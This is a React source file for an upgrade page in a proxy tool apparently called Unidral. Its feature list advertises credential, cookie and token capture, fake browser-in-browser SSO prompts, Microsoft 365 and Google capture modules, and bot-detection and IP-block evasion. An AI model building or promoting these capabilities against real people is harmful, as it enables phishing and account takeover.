import * as React from "react";
import { PanelLeft } from "lucide-react";
import { AppSidebar } from "@/components/app-sidebar";
import { Drawer } from "@/components/ui";
import { useIsDesktop } from "@/components/use-media-query";

const UPGRADE_URL = "https://unidral.cc";

const PRO_FEATURES = [
  ["Session capture", "Credentials, cookies, and tokens captured as visitors authenticate — full session replay with structured loot storage."],
  ["Browser-in-the-Browser", "Realistic in-page browser windows for credential flows — convincing SSO and OAuth prompts without leaving the page."],
  ["Pages Mode", "Per-visitor isolated sessions served from Cloudflare Workers — each visitor gets their own upstream state and cookie jar."],
  ["Telegram notifications", "Real-time alerts when credentials, sessions, or visitor events are captured — with Geo-IP and user-agent context."],
  ["WARP / Workers egress", "Route upstream traffic through Cloudflare WARP or Workers egress — rotating exit IPs defeat IP-based blocking."],
  ["TLS impersonation", "Real browser TLS fingerprints on upstream connections — passes JA3/JA4 checks that flag plain Node.js."],
  ["Bot detection bypass", "Client-side shims that neutralize bot scoring, headless checks, and fingerprinting scripts on the target."],
  ["Forensics & OpSec", "Visitor timelines, traffic analytics, and operational security dashboards — know who visited and what they did."],
  ["M365 & Google modules", "Production-ready capture modules for Microsoft 365 and Google, shipped and maintained with Pro."],
  ["Custom modules", "Additional capture modules for other platforms, built on request after purchase."],
  ["Full DevTools toolbar", "The complete 7-tab in-page toolbar — elements, rules, console, network, storage, and more on every dev site."],
];

export default function UpgradePage() {
  const isDesktop = useIsDesktop();
  const [collapsed, setCollapsed] = React.useState(false);
  const [drawerOpen, setDrawerOpen] = React.useState(false);

  const showFloatingToggle = isDesktop ? collapsed : true;

  return (
    <div className="flex h-screen w-full overflow-hidden bg-canvas">
      {isDesktop ? (
        <AppSidebar collapsed={collapsed} onToggle={() => setCollapsed((v) => !v)} />
      ) : (
        <Drawer open={drawerOpen} onClose={() => setDrawerOpen(false)}>
          <AppSidebar collapsed={false} variant="drawer" onToggle={() => setDrawerOpen(false)} />
        </Drawer>
      )}

      <main className="scroll-thin relative flex-1 overflow-y-auto">
        {showFloatingToggle ? (
          <button
            type="button"
            title={isDesktop ? "Expand sidebar" : "Open menu"}
            onClick={() => (isDesktop ? setCollapsed(false) : setDrawerOpen(true))}
            className="absolute left-[14px] top-[10px] z-20 flex h-[26px] w-[26px] items-center justify-center rounded-[5px] text-fg2 transition-colors hover:bg-line hover:text-fg md:left-[20px] md:top-[8px] md:h-[24px] md:w-[24px]"
          >
            <PanelLeft className="h-[15px] w-[15px]" strokeWidth={1.8} />
          </button>
        ) : null}

        <div className="mx-auto w-full max-w-[760px] px-[16px] pb-[100px] pt-[60px] md:px-[24px] md:pt-[72px]">
          <div className="px-[8px]">
            <h1 className="text-[20px] font-bold tracking-tight text-fg">Upgrade to Pro</h1>
            <p className="mt-[6px] max-w-[560px] text-[13px] leading-[20px] text-fg3">
              You are running the free OSS edition — a clean proxy engine. Unidral Pro is the
              full platform for security testing and red team operations: adversary emulation,
              session capture, anti-detection, egress routing, and the operational toolkit.
            </p>
            <a
              href={UPGRADE_URL}
              target="_blank"
              rel="noreferrer"
              className="group mt-[14px] inline-flex items-baseline gap-[6px] text-[13.5px] font-medium text-fg"
            >
              <span className="border-b border-fg pb-[1px] transition-colors group-hover:border-accent group-hover:text-accent">
                Get Unidral Pro at unidral.cc
              </span>
              <span className="text-fg4 transition-colors group-hover:text-accent">↗</span>
            </a>
          </div>

          <div className="mt-[36px]">
            <div className="border-t border-line">
              {PRO_FEATURES.map(([title, desc]) => (
                <div
                  key={title}
                  className="flex flex-col gap-[2px] border-b border-line px-[8px] py-[13px] sm:flex-row sm:gap-[24px]"
                >
                  <span className="w-[190px] shrink-0 text-[13px] font-medium text-fg">{title}</span>
                  <span className="text-[12.5px] leading-[19px] text-fg3">{desc}</span>
                </div>
              ))}
            </div>
          </div>

          <p className="mt-[28px] px-[8px] text-[12.5px] leading-[19px] text-fg3">
            Pro ships with the M365 and Google capture modules included. Additional modules for
            other platforms can be built on request —{" "}
            <a
              href={UPGRADE_URL}
              target="_blank"
              rel="noreferrer"
              className="text-fg underline decoration-line underline-offset-2 transition-colors hover:text-accent hover:decoration-accent"
            >
              unidral.cc
            </a>
            .
          </p>
        </div>
      </main>
    </div>
  );
}
